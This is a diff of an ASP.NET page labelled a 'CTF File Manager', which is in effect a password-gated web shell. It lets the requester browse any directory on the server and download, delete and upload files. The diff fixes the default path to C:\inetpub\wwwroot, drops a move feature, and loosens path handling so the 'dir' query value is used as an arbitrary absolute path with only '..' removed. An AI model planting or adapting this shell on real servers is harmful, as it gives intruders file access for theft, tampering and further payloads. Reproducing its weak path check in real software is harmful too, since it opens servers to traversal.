@@ -7,7 +7,7 @@
 <script runat="server">
     string correctMD5 = "e662ddd93d6f72abfb31328821b595cc"; 
 
-    string currentPath = "";
+    string currentPath = @"C:\inetpub\wwwroot";   // Default Path
 
     protected void Page_Load(object sender, EventArgs e)
     {
@@ -20,8 +20,11 @@
             Response.End();
         }
 
-        currentPath = Request.QueryString["dir"] ?? "";
-        currentPath = currentPath.Replace("..", "").Replace("\\", "/").Trim('/');
+        // Get directory from URL or use default
+        if (!string.IsNullOrEmpty(Request.QueryString["dir"]))
+        {
+            currentPath = Request.QueryString["dir"].Replace("..", "");
+        }
 
         // Download
         if (Request.QueryString["action"] == "download" && !string.IsNullOrEmpty(Request.QueryString["file"]))
@@ -34,13 +37,6 @@
         {
             DeleteFile(Request.QueryString["del"]);
             Response.Redirect(GetCurrentUrl() + "&msg=deleted");
-        }
-
-        // Move
-        if (Request.QueryString["action"] == "move" && !string.IsNullOrEmpty(Request.QueryString["target"]))
-        {
-            MoveFile(Request.QueryString["target"], Request.QueryString["dest"]);
-            Response.Redirect(GetCurrentUrl() + "&msg=moved");
         }
 
         if (Request.QueryString["msg"] != null)
@@ -61,22 +57,11 @@
         }
     }
 
-    string GetFullPath(string relative)
-    {
-        if (string.IsNullOrEmpty(currentPath))
-            return Server.MapPath("~/" + relative);
-        
-        if (currentPath.Contains(":")) // Absolute path (C:/, D:/ etc)
-            return Path.Combine(currentPath, relative).Replace("/", "\\");
-        else
-            return Server.MapPath("~/" + currentPath + "/" + relative);
-    }
-
     void DownloadFile(string fileName)
     {
         try
         {
-            string fullPath = GetFullPath(Server.UrlDecode(fileName));
+            string fullPath = Path.Combine(currentPath, Server.UrlDecode(fileName));
             if (File.Exists(fullPath))
             {
                 Response.Clear();
@@ -93,22 +78,8 @@
     {
         try
         {
-            string fullPath = GetFullPath(Server.UrlDecode(fileName));
+            string fullPath = Path.Combine(currentPath, Server.UrlDecode(fileName));
             if (File.Exists(fullPath)) File.Delete(fullPath);
-        }
-        catch { }
-    }
-
-    void MoveFile(string sourceFile, string destFolder)
-    {
-        try
-        {
-            string source = GetFullPath(Server.UrlDecode(sourceFile));
-            string destDir = GetFullPath(Server.UrlDecode(destFolder));
-            string dest = Path.Combine(destDir, Path.GetFileName(source));
-
-            if (File.Exists(source) && Directory.Exists(destDir))
-                File.Move(source, dest);
         }
         catch { }
     }
@@ -120,9 +91,9 @@
             try
             {
                 string fileName = Path.GetFileName(FileUpload1.FileName);
-                string savePath = GetFullPath(fileName);
+                string savePath = Path.Combine(currentPath, fileName);
                 FileUpload1.SaveAs(savePath);
-                lblMsg.Text = "<span style='color:lime'>✅ Uploaded: " + fileName + "</span>";
+                lblMsg.Text = "<span style='color:lime'>✅ Uploaded Successfully: " + fileName + "</span>";
             }
             catch (Exception ex)
             {
@@ -135,7 +106,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF Full File Manager</title>
+    <title>CTF File Manager - inetpub</title>
     <style>
         body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }
         table { border-collapse: collapse; width: 100%; }
@@ -144,25 +115,16 @@
         a { color: #00ffff; text-decoration: none; }
         a:hover { color: white; }
         .dir { color: #ffff00; font-weight: bold; }
-        .current-path { background:#111; padding:12px; border:1px solid #00ff00; margin:10px 0; font-size:15px; }
-        .drives { background:#111; padding:10px; margin:10px 0; border:1px dashed #ffff00; }
-        .actions a { margin-right: 12px; }
+        .current-path { background:#111; padding:12px; border:1px solid #00ff00; margin:15px 0; }
     </style>
 </head>
 <body>
-    <h1>🛠️ CTF Full File Manager (All Drives)</h1>
+    <h1>🛠️ CTF File Manager - C:\inetpub\wwwroot</h1>
 
     <div class="current-path">
-        <strong>Current Path:</strong> <%= string.IsNullOrEmpty(currentPath) ? "Web Root" : currentPath %> 
-        <a href="?p=<%= Request.QueryString["p"] %>">[ Web Root ]</a>
-    </div>
-
-    <!-- All Logical Drives -->
-    <div class="drives">
-        <strong>💾 Logical Drives:</strong> &nbsp;
-        <% foreach (var drive in DriveInfo.GetDrives().Where(d => d.IsReady)) { %>
-            <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(drive.Name) %>"><%= drive.Name %></a> &nbsp;
-        <% } %>
+        <strong>Current Directory:</strong> <%= currentPath %>
+        <br>
+        <a href="?p=<%= Request.QueryString["p"] %>&dir=C:\inetpub\wwwroot">[ Go to Web Root ]</a>
     </div>
 
     <!-- Upload -->
@@ -187,13 +149,9 @@
         </tr>
 
         <!-- Go Up -->
-        <% if (!string.IsNullOrEmpty(currentPath)) { 
-            string parent = currentPath.Contains("/") || currentPath.Contains("\\") 
-                ? currentPath.Substring(0, Math.Max(currentPath.LastIndexOf("/"), currentPath.LastIndexOf("\\"))) 
-                : "";
-        %>
+        <% if (currentPath.Length > 3) { %>
         <tr>
-            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parent) %>">.. (Go Up)</a></td>
+            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(Directory.GetParent(currentPath)?.FullName) %>">.. (Go Up)</a></td>
             <td>Folder</td>
             <td></td>
             <td></td>
@@ -202,10 +160,8 @@
         <% } %>
 
         <% 
-            string physicalPath = GetFullPath("");
-            
             // Folders
-            foreach (var dir in Directory.GetDirectories(physicalPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
+            foreach (var dir in Directory.GetDirectories(currentPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
             {
         %>
         <tr>
@@ -218,7 +174,7 @@
         <% } %>
 
         <!-- Files -->
-        <% foreach (var file in Directory.GetFiles(physicalPath).Select(f => new FileInfo(f)).OrderBy(f => f.Name))
+        <% foreach (var file in Directory.GetFiles(currentPath).Select(f => new FileInfo(f)).OrderBy(f => f.Name))
            {
                string encoded = Server.UrlEncode(file.Name);
         %>
@@ -227,35 +183,13 @@
             <td>File</td>
             <td><%= (file.Length / 1024.0).ToString("0.##") %> KB</td>
             <td><%= file.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
-            <td class="actions">
-                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&action=download&file=<%= encoded %>">⬇️ Download</a>
+            <td>
+                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&action=download&file=<%= encoded %>">⬇️ Download</a> |
                 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&del=<%= encoded %>" 
                    onclick="return confirm('Delete this file?')">🗑️ Delete</a>
-                <a href="javascript:void(0)" onclick="moveFile('<%= encoded %>')">🔀 Move</a>
             </td>
         </tr>
         <% } %>
     </table>
-
-    <!-- Move Form -->
-    <div style="border:2px dashed #00ff00; padding:15px; background:#111; margin:15px 0; display:none;" id="moveForm">
-        <h2>Move File</h2>
-        <form method="get">
-            <input type="hidden" name="p" value="<%= Request.QueryString["p"] %>" />
-            <input type="hidden" name="dir" value="<%= currentPath %>" />
-            <input type="hidden" name="action" value="move" />
-            <input type="hidden" id="source" name="target" />
-            To Path: <input type="text" name="dest" placeholder="C:/Temp or foldername" style="width:350px;padding:6px;"/>
-            <input type="submit" value="Move" />
-            <button type="button" onclick="document.getElementById('moveForm').style.display='none'">Cancel</button>
-        </form>
-    </div>
-
-    <script>
-        function moveFile(filename) {
-            document.getElementById('source').value = filename;
-            document.getElementById('moveForm').style.display = 'block';
-        }
-    </script>
 </body>
 </html>
